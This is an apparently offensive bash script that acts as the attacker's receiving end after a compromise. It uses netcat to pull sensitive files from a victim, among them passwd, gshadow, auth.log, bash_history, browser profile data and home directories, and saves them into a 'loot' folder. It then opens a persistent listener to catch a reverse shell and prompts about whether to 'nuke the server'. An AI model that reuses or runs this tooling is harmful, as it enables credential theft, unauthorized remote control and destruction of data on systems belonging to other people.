#rename filenames inside of an array
declare -a array=( "passwd" "hostname" "profile" "timezone" "fstab"  "hosts" "gshadow"  "kern.log" "lastlog" "user.log" "auth.log" "faillog" "dmesg"  "term.log" "history.log" "bash_history" "bashrc" "config" "mozilla" "profile" "cache" "root_dir" "home_dir" )
for i in "${array[@]}";do		# iterate over the array to gather filenames
	echo "${i} -->>------->>-------->> AWAITING  FILE"
	echo "${i} .... -->>------->>--->> RECEIVING FILE  NOW"

	nc 127.0.0.1  1234 -vvv > $PWD/loot/${i} 		## sending the file 
		 
	
	echo "FINISHED DOWNLOADING ${i} !!!"
	sleep 1
	

done
	trap exit INT  ## create a ctrl+c trap incase you want to stop the connection loop 
	echo " SETTING UP LISTENER AWAITING CALLBACK FOR A SHELL!! "
	echo " CONTROL CENTER READY FOR SHELL !!! "

	while [ a=a ]; do nc -l -p 4201 -vvv ; done;  ## connect to the listener as a reverse shell 


echo " EXITING OUT WOULD YOU LIKE ME TO NUKE THE SERVER? "
echo " TYPE YES TO CONFIRM, NO TO DECLINE "
